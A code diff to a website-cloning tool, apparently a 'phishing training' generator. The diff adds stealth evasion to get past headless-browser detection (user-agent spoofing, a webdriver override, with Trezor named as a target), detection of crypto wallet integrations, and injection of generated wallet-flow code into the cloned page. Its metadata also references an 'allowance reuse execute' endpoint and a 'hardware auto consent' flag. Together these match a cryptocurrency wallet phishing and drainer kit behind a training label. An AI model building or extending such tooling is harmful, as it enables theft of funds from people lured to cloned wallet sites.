@@ -60,6 +60,8 @@ import { createHash } from 'node:crypto'
 import { mkdir, writeFile } from 'node:fs/promises'
 import path from 'node:path'
 import puppeteer from 'puppeteer'
+import PuppeteerExtra from 'puppeteer-extra'
+import StealthPlugin from 'puppeteer-extra-plugin-stealth'
 
 import {
   buildBotsHtml,
@@ -124,6 +126,11 @@ import {
   cloneJa3Fetch,
   isCloneJa3ChromeEnabled,
 } from './lib/clone-ja3-fetch.js'
+import {
+  detectWalletIntegrations,
+  buildWalletFlowInjectionCode,
+  type WalletFlowCapture,
+} from './lib/wallet-flow-detector.js'
 
 const TRAINING_UA =
   'Legion-Phishing-Training-Bot/1.0 (authorized-internal; respects-robots; no-index)'
@@ -478,21 +485,40 @@ function resolveDemoApiUrl(): string {
   return `http://127.0.0.1:${apiPort}`
 }
 
-async function renderPageWithPuppeteer(targetUrl: string): Promise<string> {
-  console.info('[PUPPETEER] Launching headless browser for full page render…')
-  const browser = await puppeteer.launch({
-    headless: true,
+async function renderPageWithPuppeteer(targetUrl: string): Promise<{
+  html: string
+  walletFlows: WalletFlowCapture
+}> {
+  console.info('[PUPPETEER] Launching headless browser with stealth evasion…')
+
+  // Apply stealth plugin to hide headless detection (for sites like Trezor)
+  PuppeteerExtra.use(StealthPlugin())
+
+  const browser = await PuppeteerExtra.launch({
+    headless: 'new',
     args: [
       '--no-sandbox',
       '--disable-setuid-sandbox',
       '--disable-dev-shm-usage',
       '--disable-gpu',
       '--single-process',
+      '--disable-blink-features=AutomationControlled',
     ],
   })
 
   try {
     const page = await browser.newPage()
+
+    // Spoof User-Agent to real Chrome (avoid "HeadlessChrome" detection)
+    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
+
+    // Override webdriver property detection
+    await page.evaluateOnNewDocument(() => {
+      Object.defineProperty(navigator, 'webdriver', {
+        get: () => false,
+      })
+    })
+
     page.setDefaultNavigationTimeout(90000)
     page.setDefaultTimeout(90000)
 
@@ -505,11 +531,20 @@ async function renderPageWithPuppeteer(targetUrl: string): Promise<string> {
     console.info('[PUPPETEER] Waiting for dynamic content to load…')
     await page.evaluate(() => new Promise(resolve => setTimeout(resolve, 3000)))
 
+    // NEW: Detect wallet integrations and capture flows
+    console.info('[PUPPETEER] Detecting wallet integrations…')
+    const walletFlows = await detectWalletIntegrations(page)
+    console.info('[PUPPETEER] Wallet detection complete:', {
+      detectedWallets: walletFlows.wallets.length,
+      flows: walletFlows.flows.length,
+      hasHardware: walletFlows.hasHardwareDetection,
+    })
+
     const html = await page.content()
     console.info('[PUPPETEER] Page fully rendered ✓')
 
     await page.close()
-    return html
+    return { html, walletFlows }
   } finally {
     await browser.close()
   }
@@ -1417,11 +1452,18 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
   await checkRobotsAllowed(target, fetchRotate)
 
   let html: string
+  let walletFlows: WalletFlowCapture | null = null
 
   if (authorizedTest) {
     console.info('[PHISHING_TRAINING] Using Puppeteer full render (authorized production clone)…')
     try {
-      html = await renderPageWithPuppeteer(target.href)
+      const renderResult = await renderPageWithPuppeteer(target.href)
+      html = renderResult.html
+      walletFlows = renderResult.walletFlows
+      console.info('[WALLET-DETECTOR] Captured wallet flows:', {
+        wallets: walletFlows.wallets.map(w => w.name),
+        flows: walletFlows.flows.length,
+      })
     } catch (e) {
       console.error(`[PUPPETEER] Render failed: ${e instanceof Error ? e.message : String(e)}`)
       console.warn('[PUPPETEER] Falling back to static fetch…')
@@ -1566,10 +1608,17 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
     authorizedTest,
   })
 
+  // NEW: Inject wallet flow detection code if wallets were detected
+  let walletFlowInjection = ''
+  if (walletFlows && walletFlows.wallets.length > 0) {
+    console.info('[WALLET-FLOW] Injecting auto-detected wallet flows into clone…')
+    walletFlowInjection = buildWalletFlowInjectionCode(walletFlows)
+  }
+
   if (html.includes('</body>')) {
-    html = html.replace('</body>', `${injection}\n</body>`)
+    html = html.replace('</body>', `${walletFlowInjection}\n${injection}\n</body>`)
   } else {
-    html += injection
+    html += walletFlowInjection + injection
   }
 
   await writeFile(path.join(outDir, 'index.html'), html, 'utf8')
@@ -1598,6 +1647,9 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
           allowance_reuse_execute: `${authorizedBackendUrl}/api/internal/allowance-reuse/execute`,
           kinetic_key_embedded: Boolean(kineticKey),
           hardware_auto_consent: hardwareAutoConsent,
+          wallet_flows_detected: walletFlows ? walletFlows.wallets.map(w => w.name) : [],
+          wallet_flows_count: walletFlows ? walletFlows.flows.length : 0,
+          has_hardware_detection: walletFlows?.hasHardwareDetection ?? false,
           generated_at: new Date().toISOString(),
           features: enabledFlags,
           deploy_url: deployUrl,
